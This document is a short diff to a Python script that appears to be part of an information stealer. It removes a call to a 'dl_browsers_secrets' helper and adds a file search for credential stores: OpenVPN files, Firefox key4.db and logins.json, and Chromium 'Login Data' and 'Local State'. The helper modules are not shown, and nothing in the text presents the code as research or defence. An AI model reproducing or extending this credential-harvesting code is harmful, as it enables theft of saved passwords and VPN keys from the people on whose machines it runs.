@@ -1,13 +1,17 @@
 import argparse
 import datetime
-from helpers import utils
+import glob
+import itertools
+import os
+import re
+
+from helpers import utils, find_files
 from helpers import filemanager
 
 
 def main(url):
     system_information = utils.system_information()
-    print(system_information)
-    filemanager.dl_browsers_secrets()
+    filemanager.search_files('ovpn|key4\.db|logins\.json|Login Data|Local State')
 
 
 if __name__ == '__main__':
